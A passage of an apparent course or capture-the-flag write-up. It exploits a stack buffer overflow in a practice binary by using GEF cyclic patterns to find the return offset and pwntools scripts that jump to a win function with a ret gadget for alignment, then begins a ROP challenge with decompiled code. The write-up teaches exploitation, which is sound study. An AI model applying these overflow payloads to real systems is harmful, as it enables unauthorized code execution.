</span><span id=__span-2-24><a href=#__codelineno-2-24 id=__codelineno-2-24 name=__codelineno-2-24></a>$r13   : 0x00007fffffffdb58  →  0x00007fffffffdf3b  →  "CLUTTER_IM_MODULE=ibus"
</span><span id=__span-2-25><a href=#__codelineno-2-25 id=__codelineno-2-25 name=__codelineno-2-25></a>$r14   : 0x0000000000403e00  →  0x0000000000401150  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
</span><span id=__span-2-26><a href=#__codelineno-2-26 id=__codelineno-2-26 name=__codelineno-2-26></a>$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000000000000000
</span><span id=__span-2-27><a href=#__codelineno-2-27 id=__codelineno-2-27 name=__codelineno-2-27></a>$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
</span><span id=__span-2-28><a href=#__codelineno-2-28 id=__codelineno-2-28 name=__codelineno-2-28></a>$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
</span><span id=__span-2-29><a href=#__codelineno-2-29 id=__codelineno-2-29 name=__codelineno-2-29></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span><span id=__span-2-30><a href=#__codelineno-2-30 id=__codelineno-2-30 name=__codelineno-2-30></a>0x00007fffffffda38│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"       ← $rsp
</span><span id=__span-2-31><a href=#__codelineno-2-31 id=__codelineno-2-31 name=__codelineno-2-31></a>0x00007fffffffda40│+0x0008: "AAAAAAAAAAAAAAAAAAAA"
</span><span id=__span-2-32><a href=#__codelineno-2-32 id=__codelineno-2-32 name=__codelineno-2-32></a>0x00007fffffffda48│+0x0010: "AAAAAAAAAAAA"
</span><span id=__span-2-33><a href=#__codelineno-2-33 id=__codelineno-2-33 name=__codelineno-2-33></a>0x00007fffffffda50│+0x0018: 0x0000000041414141 ("AAAA"?)
</span><span id=__span-2-34><a href=#__codelineno-2-34 id=__codelineno-2-34 name=__codelineno-2-34></a>0x00007fffffffda58│+0x0020: 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-win/[...]"
</span><span id=__span-2-35><a href=#__codelineno-2-35 id=__codelineno-2-35 name=__codelineno-2-35></a>0x00007fffffffda60│+0x0028: 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-win/[...]"
</span><span id=__span-2-36><a href=#__codelineno-2-36 id=__codelineno-2-36 name=__codelineno-2-36></a>0x00007fffffffda68│+0x0030: 0x2636e545aa3b0b1f
</span><span id=__span-2-37><a href=#__codelineno-2-37 id=__codelineno-2-37 name=__codelineno-2-37></a>0x00007fffffffda70│+0x0038: 0x0000000000000000
</span><span id=__span-2-38><a href=#__codelineno-2-38 id=__codelineno-2-38 name=__codelineno-2-38></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-2-39><a href=#__codelineno-2-39 id=__codelineno-2-39 name=__codelineno-2-39></a>[#0] Id 1, Name: "chall", stopped 0x40128f in main (), reason: SIGSEGV
</span><span id=__span-2-40><a href=#__codelineno-2-40 id=__codelineno-2-40 name=__codelineno-2-40></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-2-41><a href=#__codelineno-2-41 id=__codelineno-2-41 name=__codelineno-2-41></a>[#0] 0x40128f → main()
</span></code></pre></div> <p>Here we gave the program 100 'A's, much larger than the buffer we saw inside the main function, and the result? The binary segments or crashes because it tried to jump to an invalid address. The reason behind this is because we filled that name buffer so much, that it kept writing over the stack, and thus the return register.</p> <p>In our case, the binary is compiled in x86-64, so the register that controls the next instruction is RSP. This is the register we want to control since it will let us control what instruction the binary jumps to next. We can do this very easily using <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">de Bruijn Sequence</a>, also known as a cyclic pattern, which is also built into <a href="https://hugsy.github.io/gef/">GEF</a>! We can easily get the offset needed to get RSP by doing the following:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-3-1><a href=#__codelineno-3-1 id=__codelineno-3-1 name=__codelineno-3-1></a>gef➤  pattern create 100
</span><span id=__span-3-2><a href=#__codelineno-3-2 id=__codelineno-3-2 name=__codelineno-3-2></a>[+] Generating a pattern of 100 bytes (n=8)
</span><span id=__span-3-3><a href=#__codelineno-3-3 id=__codelineno-3-3 name=__codelineno-3-3></a>aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span><span id=__span-3-4><a href=#__codelineno-3-4 id=__codelineno-3-4 name=__codelineno-3-4></a>[+] Saved as '$_gef0'
</span><span id=__span-3-5><a href=#__codelineno-3-5 id=__codelineno-3-5 name=__codelineno-3-5></a>
</span><span id=__span-3-6><a href=#__codelineno-3-6 id=__codelineno-3-6 name=__codelineno-3-6></a>gef➤  run
</span><span id=__span-3-7><a href=#__codelineno-3-7 id=__codelineno-3-7 name=__codelineno-3-7></a>hey bud, how's it goin'? what's your name?
</span><span id=__span-3-8><a href=#__codelineno-3-8 id=__codelineno-3-8 name=__codelineno-3-8></a>&gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
</span><span id=__span-3-9><a href=#__codelineno-3-9 id=__codelineno-3-9 name=__codelineno-3-9></a>
</span><span id=__span-3-10><a href=#__codelineno-3-10 id=__codelineno-3-10 name=__codelineno-3-10></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span><span id=__span-3-11><a href=#__codelineno-3-11 id=__codelineno-3-11 name=__codelineno-3-11></a>0x00007fffffffda38│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"       ← $rsp
</span><span id=__span-3-12><a href=#__codelineno-3-12 id=__codelineno-3-12 name=__codelineno-3-12></a>0x00007fffffffda40│+0x0008: "kaaaaaaalaaaaaaamaaa"
</span><span id=__span-3-13><a href=#__codelineno-3-13 id=__codelineno-3-13 name=__codelineno-3-13></a>0x00007fffffffda48│+0x0010: "laaaaaaamaaa"
</span><span id=__span-3-14><a href=#__codelineno-3-14 id=__codelineno-3-14 name=__codelineno-3-14></a>0x00007fffffffda50│+0x0018: 0x000000006161616d ("maaa"?)
</span><span id=__span-3-15><a href=#__codelineno-3-15 id=__codelineno-3-15 name=__codelineno-3-15></a>0x00007fffffffda58│+0x0020: 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-win/[...]"
</span><span id=__span-3-16><a href=#__codelineno-3-16 id=__codelineno-3-16 name=__codelineno-3-16></a>0x00007fffffffda60│+0x0028: 0x00007fffffffdb48  →  0x00007fffffffdf03  →  "/pwn-simple-win/[...]"
</span><span id=__span-3-17><a href=#__codelineno-3-17 id=__codelineno-3-17 name=__codelineno-3-17></a>0x00007fffffffda68│+0x0030: 0x6d6484d5603fb66b
</span><span id=__span-3-18><a href=#__codelineno-3-18 id=__codelineno-3-18 name=__codelineno-3-18></a>0x00007fffffffda70│+0x0038: 0x0000000000000000
</span><span id=__span-3-19><a href=#__codelineno-3-19 id=__codelineno-3-19 name=__codelineno-3-19></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-3-20><a href=#__codelineno-3-20 id=__codelineno-3-20 name=__codelineno-3-20></a>[#0] Id 1, Name: "chall", stopped 0x40128f in main (), reason: SIGSEGV
</span><span id=__span-3-21><a href=#__codelineno-3-21 id=__codelineno-3-21 name=__codelineno-3-21></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-3-22><a href=#__codelineno-3-22 id=__codelineno-3-22 name=__codelineno-3-22></a>[#0] 0x40128f → main()
</span><span id=__span-3-23><a href=#__codelineno-3-23 id=__codelineno-3-23 name=__codelineno-3-23></a>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span><span id=__span-3-24><a href=#__codelineno-3-24 id=__codelineno-3-24 name=__codelineno-3-24></a>
</span><span id=__span-3-25><a href=#__codelineno-3-25 id=__codelineno-3-25 name=__codelineno-3-25></a>gef➤  pattern search $rsp
</span><span id=__span-3-26><a href=#__codelineno-3-26 id=__codelineno-3-26 name=__codelineno-3-26></a>[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
</span><span id=__span-3-27><a href=#__codelineno-3-27 id=__codelineno-3-27 name=__codelineno-3-27></a>[+] Found at offset 72 (little-endian search) likely
</span></code></pre></div> <p>And just like magic, we now know the offset we need to control RSP is 72. Now all that's left is to get the address for the <code>win</code> function. We can do that pretty easily:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-4-1><a href=#__codelineno-4-1 id=__codelineno-4-1 name=__codelineno-4-1></a>gef➤  info func win
</span><span id=__span-4-2><a href=#__codelineno-4-2 id=__codelineno-4-2 name=__codelineno-4-2></a>All functions matching regular expression "win":
</span><span id=__span-4-3><a href=#__codelineno-4-3 id=__codelineno-4-3 name=__codelineno-4-3></a>
</span><span id=__span-4-4><a href=#__codelineno-4-4 id=__codelineno-4-4 name=__codelineno-4-4></a>Non-debugging symbols:
</span><span id=__span-4-5><a href=#__codelineno-4-5 id=__codelineno-4-5 name=__codelineno-4-5></a>0x0000000000401186  win
</span></code></pre></div> <p>So <code>win</code> is at <code>0x401186</code>. Throw that into a simple pwnlib script:</p> <div class="language-py highlight"><pre><span></span><code><span id=__span-5-1><a href=#__codelineno-5-1 id=__codelineno-5-1 name=__codelineno-5-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-5-2><a href=#__codelineno-5-2 id=__codelineno-5-2 name=__codelineno-5-2></a><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-5-3><a href=#__codelineno-5-3 id=__codelineno-5-3 name=__codelineno-5-3></a>
</span><span id=__span-5-4><a href=#__codelineno-5-4 id=__codelineno-5-4 name=__codelineno-5-4></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>'A'</span> <span class=o>*</span> <span class=mi>72</span> <span class=c1># either do some pwntools cyclic stuff or GEF cyclic find rsp offset</span>
</span><span id=__span-5-5><a href=#__codelineno-5-5 id=__codelineno-5-5 name=__codelineno-5-5></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401186</span><span class=p>)</span>  <span class=c1># jump to win</span>
</span><span id=__span-5-6><a href=#__codelineno-5-6 id=__codelineno-5-6 name=__codelineno-5-6></a>
</span><span id=__span-5-7><a href=#__codelineno-5-7 id=__codelineno-5-7 name=__codelineno-5-7></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>'&gt; '</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span><span id=__span-5-8><a href=#__codelineno-5-8 id=__codelineno-5-8 name=__codelineno-5-8></a><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></code></pre></div> <p>Uh oh, running this we get the following: <div class="language-bash highlight"><pre><span></span><code><span id=__span-6-1><a href=#__codelineno-6-1 id=__codelineno-6-1 name=__codelineno-6-1></a>$<span class=w> </span>python<span class=w> </span>exploit.py
</span><span id=__span-6-2><a href=#__codelineno-6-2 id=__codelineno-6-2 name=__codelineno-6-2></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>'./chall'</span>:<span class=w> </span>pid<span class=w> </span><span class=m>785692</span>
</span><span id=__span-6-3><a href=#__codelineno-6-3 id=__codelineno-6-3 name=__codelineno-6-3></a><span class=o>[</span>+<span class=o>]</span><span class=w> </span>Receiving<span class=w> </span>all<span class=w> </span>data:<span class=w> </span>Done<span class=w> </span><span class=o>(</span>204B<span class=o>)</span>
</span><span id=__span-6-4><a href=#__codelineno-6-4 id=__codelineno-6-4 name=__codelineno-6-4></a><span class=o>[</span>*<span class=o>]</span><span class=w> </span>Process<span class=w> </span><span class=s1>'./chall'</span><span class=w> </span>stopped<span class=w> </span>with<span class=w> </span><span class=nb>exit</span><span class=w> </span>code<span class=w> </span>-11<span class=w> </span><span class=o>(</span>SIGSEGV<span class=o>)</span><span class=w> </span><span class=o>(</span>pid<span class=w> </span><span class=m>785692</span><span class=o>)</span>
</span></code></pre></div></p> <p>We get a segmentation fault! What's wrong?! Let's open this in gdb by replacing our <code>process('./chall')</code> with <code>gdb.debug('./chall')</code>. Running it again will open GDB for us and show what went wrong:</p> <h3 id=stack-misalignment>Stack Misalignment<a class=headerlink href=#stack-misalignment title="Permanent link">¶</a></h3> <div class="language-text highlight"><pre><span></span><code><span id=__span-7-1><a href=#__codelineno-7-1 id=__codelineno-7-1 name=__codelineno-7-1></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
</span><span id=__span-7-2><a href=#__codelineno-7-2 id=__codelineno-7-2 name=__codelineno-7-2></a>0x00007ffdfd5112d8│+0x0000: 0x00000000004011fb  →  &lt;main+0&gt; push rbp     ← $rsp
</span><span id=__span-7-3><a href=#__codelineno-7-3 id=__codelineno-7-3 name=__codelineno-7-3></a>0x00007ffdfd5112e0│+0x0008: 0x0000000100400040 ("@"?)
</span><span id=__span-7-4><a href=#__codelineno-7-4 id=__codelineno-7-4 name=__codelineno-7-4></a>0x00007ffdfd5112e8│+0x0010: 0x00007ffdfd5113d8  →  0x00007ffdfd512f76  →  0x006c6c6168632f2e ("./chall"?)
</span><span id=__span-7-5><a href=#__codelineno-7-5 id=__codelineno-7-5 name=__codelineno-7-5></a>0x00007ffdfd5112f0│+0x0018: 0x00007ffdfd5113d8  →  0x00007ffdfd512f76  →  0x006c6c6168632f2e ("./chall"?)
</span><span id=__span-7-6><a href=#__codelineno-7-6 id=__codelineno-7-6 name=__codelineno-7-6></a>0x00007ffdfd5112f8│+0x0020: 0x5793733b7c5cc4d9
</span><span id=__span-7-7><a href=#__codelineno-7-7 id=__codelineno-7-7 name=__codelineno-7-7></a>0x00007ffdfd511300│+0x0028: 0x0000000000000000   ← $rip
</span><span id=__span-7-8><a href=#__codelineno-7-8 id=__codelineno-7-8 name=__codelineno-7-8></a>0x00007ffdfd511308│+0x0030: 0x00007ffdfd5113e8  →  0x00007ffdfd512f7e  →  "CLUTTER_IM_MODULE=ibus"
</span><span id=__span-7-9><a href=#__codelineno-7-9 id=__codelineno-7-9 name=__codelineno-7-9></a>0x00007ffdfd511310│+0x0038: 0x0000000000403e00  →  0x0000000000401150  →  &lt;__do_global_dtors_aux+0&gt; endbr64 
</span><span id=__span-7-10><a href=#__codelineno-7-10 id=__codelineno-7-10 name=__codelineno-7-10></a>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
</span><span id=__span-7-11><a href=#__codelineno-7-11 id=__codelineno-7-11 name=__codelineno-7-11></a>[#0] Id 1, Name: "chall", stopped 0x7ffdfd511300 in ?? (), reason: SIGSEGV
</span><span id=__span-7-12><a href=#__codelineno-7-12 id=__codelineno-7-12 name=__codelineno-7-12></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
</span><span id=__span-7-13><a href=#__codelineno-7-13 id=__codelineno-7-13 name=__codelineno-7-13></a>[#0] 0x7ffdfd511300 → add BYTE PTR [rax], al
</span><span id=__span-7-14><a href=#__codelineno-7-14 id=__codelineno-7-14 name=__codelineno-7-14></a>[#1] 0x4011fb → win()
</span></code></pre></div> <p>Clearly, this is the problem. We're being redirected to an incorrect address. Why did this happen? Well, we can see that instead of jumping to <code>0x401186</code>, we jumped to <code>0x7ffdfd511300</code>. This is due to the stack being misaligned (x86_64 requires 16-byte stack alignment before making calls). The easiest solution for this is to pad the payload with a <code>ret</code>. We can use pwnlib's built-in ROP finder to do this for us:</p> <h3 id=final-solution>Final Solution<a class=headerlink href=#final-solution title="Permanent link">¶</a></h3> <div class="language-py highlight"><pre><span></span><code><span id=__span-8-1><a href=#__codelineno-8-1 id=__codelineno-8-1 name=__codelineno-8-1></a><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span><span id=__span-8-2><a href=#__codelineno-8-2 id=__codelineno-8-2 name=__codelineno-8-2></a><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-8-3><a href=#__codelineno-8-3 id=__codelineno-8-3 name=__codelineno-8-3></a>
</span><span id=__span-8-4><a href=#__codelineno-8-4 id=__codelineno-8-4 name=__codelineno-8-4></a><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>'./chall'</span><span class=p>)</span>
</span><span id=__span-8-5><a href=#__codelineno-8-5 id=__codelineno-8-5 name=__codelineno-8-5></a><span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>elf</span><span class=p>)</span>
</span><span id=__span-8-6><a href=#__codelineno-8-6 id=__codelineno-8-6 name=__codelineno-8-6></a>
</span><span id=__span-8-7><a href=#__codelineno-8-7 id=__codelineno-8-7 name=__codelineno-8-7></a><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>'A'</span> <span class=o>*</span> <span class=mi>72</span> <span class=c1># either do some pwntools cyclic stuff or GEF cyclic find rsp offset</span>
</span><span id=__span-8-8><a href=#__codelineno-8-8 id=__codelineno-8-8 name=__codelineno-8-8></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>find_gadget</span><span class=p>([</span><span class=s1>'ret'</span><span class=p>])[</span><span class=mi>0</span><span class=p>])</span>  <span class=c1># find and pick the first lone ret instruction for stack alignment</span>
</span><span id=__span-8-9><a href=#__codelineno-8-9 id=__codelineno-8-9 name=__codelineno-8-9></a><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x401186</span><span class=p>)</span>  <span class=c1># jump to win (since this binary is not stripped, you can use elf.symbols['win'] instead of the addr)</span>
</span><span id=__span-8-10><a href=#__codelineno-8-10 id=__codelineno-8-10 name=__codelineno-8-10></a>
</span><span id=__span-8-11><a href=#__codelineno-8-11 id=__codelineno-8-11 name=__codelineno-8-11></a><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>'&gt; '</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span> <span class=c1># send the payload</span>
</span><span id=__span-8-12><a href=#__codelineno-8-12 id=__codelineno-8-12 name=__codelineno-8-12></a><span class=nb>print</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></code></pre></div> <p>Running this we get:</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-9-1><a href=#__codelineno-9-1 id=__codelineno-9-1 name=__codelineno-9-1></a>$ python exploit.py
</span><span id=__span-9-2><a href=#__codelineno-9-2 id=__codelineno-9-2 name=__codelineno-9-2></a>[+] Starting local process './chall': pid 792122
</span><span id=__span-9-3><a href=#__codelineno-9-3 id=__codelineno-9-3 name=__codelineno-9-3></a>[*] '/pwn-simple-win/chall'
</span><span id=__span-9-4><a href=#__codelineno-9-4 id=__codelineno-9-4 name=__codelineno-9-4></a>    Arch:     amd64-64-little
</span><span id=__span-9-5><a href=#__codelineno-9-5 id=__codelineno-9-5 name=__codelineno-9-5></a>    RELRO:    Partial RELRO
</span><span id=__span-9-6><a href=#__codelineno-9-6 id=__codelineno-9-6 name=__codelineno-9-6></a>    Stack:    No canary found
</span><span id=__span-9-7><a href=#__codelineno-9-7 id=__codelineno-9-7 name=__codelineno-9-7></a>    NX:       NX disabled
</span><span id=__span-9-8><a href=#__codelineno-9-8 id=__codelineno-9-8 name=__codelineno-9-8></a>    PIE:      No PIE (0x400000)
</span><span id=__span-9-9><a href=#__codelineno-9-9 id=__codelineno-9-9 name=__codelineno-9-9></a>    RWX:      Has RWX segments
</span><span id=__span-9-10><a href=#__codelineno-9-10 id=__codelineno-9-10 name=__codelineno-9-10></a>[*] Loaded 5 cached gadgets for './chall'
</span><span id=__span-9-11><a href=#__codelineno-9-11 id=__codelineno-9-11 name=__codelineno-9-11></a>[+] Receiving all data: Done (204B)
</span><span id=__span-9-12><a href=#__codelineno-9-12 id=__codelineno-9-12 name=__codelineno-9-12></a>[*] Process './chall' stopped with exit code -11 (SIGSEGV) (pid 792122)
</span><span id=__span-9-13><a href=#__codelineno-9-13 id=__codelineno-9-13 name=__codelineno-9-13></a>hey hey nice to meet ya, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16@
</span><span id=__span-9-14><a href=#__codelineno-9-14 id=__codelineno-9-14 name=__codelineno-9-14></a>just don't be snooping around my code and we'll get along fine...
</span><span id=__span-9-15><a href=#__codelineno-9-15 id=__codelineno-9-15 name=__codelineno-9-15></a>:3c hmm how'd you get here?? try this on the real server to get the flag...
</span></code></pre></div> <p>Sweet, now we can just replace the <code>process('./chall')</code> with the server using <code>remote('ip.addr.of.server', port)</code>, and you'll get the real flag.</p> <h2 id=simple-rop>Simple ROP<a class=headerlink href=#simple-rop title="Permanent link">¶</a></h2> <div class="admonition info annotate"> <p class=admonition-title>Challenge Description</p> <p>Prove yourself and get the job</p> <p>Provided: ./chall (1)</p> </div> <ol> <li>chall: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=b2442b0ca0e49a7aae3f365a97947191f76676f2, for GNU/Linux 3.2.0, stripped</li> </ol> <p>This challenge is pretty similar to the last one, but with a slight twist. Since the binary is decompiled, you may need to find <code>entry</code> with Ghidra first and track down <code>main</code>. With that, you can also find the other "win" function by looking at defined strings and checking places where they've been used.</p> <figure> <a class=glightbox data-type=image data-width=auto data-height=auto data-title="Defined string cross references within Ghidra" data-desc-position=bottom><img alt="Defined string cross references within Ghidra" data-description loading=lazy src=../2024/cse132-hw4/_assets/rop-ghidra.png title></a> </figure> <p>From this we can get some logic from the decompiler:</p> <h3 id=decompiled-code_1>Decompiled Code<a class=headerlink href=#decompiled-code_1 title="Permanent link">¶</a></h3> <div class="language-c highlight"><pre><span></span><code><span id=__span-10-1><a href=#__codelineno-10-1 id=__codelineno-10-1 name=__codelineno-10-1></a><span class=kt>void</span><span class=w> </span><span class=nf>FUN_004016f5</span><span class=p>(</span><span class=n>undefined8</span><span class=w> </span><span class=n>param_1</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-2><a href=#__codelineno-10-2 id=__codelineno-10-2 name=__codelineno-10-2></a><span class=w>  </span><span class=kt>int</span><span class=w> </span><span class=n>iVar1</span><span class=p>;</span>
</span><span id=__span-10-3><a href=#__codelineno-10-3 id=__codelineno-10-3 name=__codelineno-10-3></a><span class=w>  </span><span class=n>undefined</span><span class=w> </span><span class=n>local_118</span><span class=w> </span><span class=p>[</span><span class=mi>264</span><span class=p>];</span>
</span><span id=__span-10-4><a href=#__codelineno-10-4 id=__codelineno-10-4 name=__codelineno-10-4></a><span class=w>  </span><span class=kt>long</span><span class=w> </span><span class=n>local_10</span><span class=p>;</span>
</span><span id=__span-10-5><a href=#__codelineno-10-5 id=__codelineno-10-5 name=__codelineno-10-5></a>
</span><span id=__span-10-6><a href=#__codelineno-10-6 id=__codelineno-10-6 name=__codelineno-10-6></a><span class=w>  </span><span class=n>iVar1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>thunk_FUN_0041eda0</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=s>"sluggggggggggggggggggsecure_umm_yeah_i_sure_hope_it_is"</span><span class=p>);</span>
</span><span id=__span-10-7><a href=#__codelineno-10-7 id=__codelineno-10-7 name=__codelineno-10-7></a><span class=w>  </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>iVar1</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-8><a href=#__codelineno-10-8 id=__codelineno-10-8 name=__codelineno-10-8></a><span class=w>    </span><span class=n>local_10</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FUN_004104d0</span><span class=p>(</span><span class=s>"flag.txt"</span><span class=p>,</span><span class=o>&amp;</span><span class=n>DAT_0047a078</span><span class=p>);</span>
</span><span id=__span-10-9><a href=#__codelineno-10-9 id=__codelineno-10-9 name=__codelineno-10-9></a>
</span><span id=__span-10-10><a href=#__codelineno-10-10 id=__codelineno-10-10 name=__codelineno-10-10></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>local_10</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-11><a href=#__codelineno-10-11 id=__codelineno-10-11 name=__codelineno-10-11></a><span class=w>      </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"wowza you</span><span class=se>\'</span><span class=s>re a pro!! submit this solution to our server for the real reward"</span><span class=p>);</span>
</span><span id=__span-10-12><a href=#__codelineno-10-12 id=__codelineno-10-12 name=__codelineno-10-12></a><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-13><a href=#__codelineno-10-13 id=__codelineno-10-13 name=__codelineno-10-13></a><span class=w>      </span><span class=n>FUN_00410240</span><span class=p>(</span><span class=n>local_118</span><span class=p>,</span><span class=mh>0x100</span><span class=p>,</span><span class=n>local_10</span><span class=p>);</span>
</span><span id=__span-10-14><a href=#__codelineno-10-14 id=__codelineno-10-14 name=__codelineno-10-14></a><span class=w>      </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"here</span><span class=se>\'</span><span class=s>s your signing bonus: "</span><span class=p>);</span>
</span><span id=__span-10-15><a href=#__codelineno-10-15 id=__codelineno-10-15 name=__codelineno-10-15></a><span class=w>      </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=n>local_118</span><span class=p>);</span>
</span><span id=__span-10-16><a href=#__codelineno-10-16 id=__codelineno-10-16 name=__codelineno-10-16></a><span class=w>      </span><span class=n>FUN_0040ff50</span><span class=p>(</span><span class=n>local_10</span><span class=p>);</span>
</span><span id=__span-10-17><a href=#__codelineno-10-17 id=__codelineno-10-17 name=__codelineno-10-17></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-10-18><a href=#__codelineno-10-18 id=__codelineno-10-18 name=__codelineno-10-18></a><span class=w>  </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-19><a href=#__codelineno-10-19 id=__codelineno-10-19 name=__codelineno-10-19></a><span class=w>    </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"sorry no can do buddy, wrong password, turn back around"</span><span class=p>);</span>
</span><span id=__span-10-20><a href=#__codelineno-10-20 id=__codelineno-10-20 name=__codelineno-10-20></a><span class=w>  </span><span class=p>}</span>
</span><span id=__span-10-21><a href=#__codelineno-10-21 id=__codelineno-10-21 name=__codelineno-10-21></a><span class=w>  </span><span class=k>return</span><span class=p>;</span>
</span><span id=__span-10-22><a href=#__codelineno-10-22 id=__codelineno-10-22 name=__codelineno-10-22></a><span class=p>}</span>
</span><span id=__span-10-23><a href=#__codelineno-10-23 id=__codelineno-10-23 name=__codelineno-10-23></a>
</span><span id=__span-10-24><a href=#__codelineno-10-24 id=__codelineno-10-24 name=__codelineno-10-24></a><span class=n>undefined8</span><span class=w> </span><span class=nf>FUN_004017ae</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-10-25><a href=#__codelineno-10-25 id=__codelineno-10-25 name=__codelineno-10-25></a><span class=w>  </span><span class=n>undefined</span><span class=w> </span><span class=n>local_58</span><span class=w> </span><span class=p>[</span><span class=mi>80</span><span class=p>];</span>
</span><span id=__span-10-26><a href=#__codelineno-10-26 id=__codelineno-10-26 name=__codelineno-10-26></a>
</span><span id=__span-10-27><a href=#__codelineno-10-27 id=__codelineno-10-27 name=__codelineno-10-27></a><span class=w>  </span><span class=n>FUN_00412840</span><span class=p>(</span><span class=n>PTR_DAT_004a66d0</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-10-28><a href=#__codelineno-10-28 id=__codelineno-10-28 name=__codelineno-10-28></a><span class=w>  </span><span class=n>FUN_00412840</span><span class=p>(</span><span class=n>PTR_DAT_004a66c8</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span><span id=__span-10-29><a href=#__codelineno-10-29 id=__codelineno-10-29 name=__codelineno-10-29></a><span class=w>  </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"=== Slug Security Technical Interview ==="</span><span class=p>);</span>
</span><span id=__span-10-30><a href=#__codelineno-10-30 id=__codelineno-10-30 name=__codelineno-10-30></a><span class=w>  </span><span class=n>FUN_00410930</span><span class=p>(</span><span class=s>"welcome candidate! before we begin, please tell us your name...."</span><span class=p>);</span>
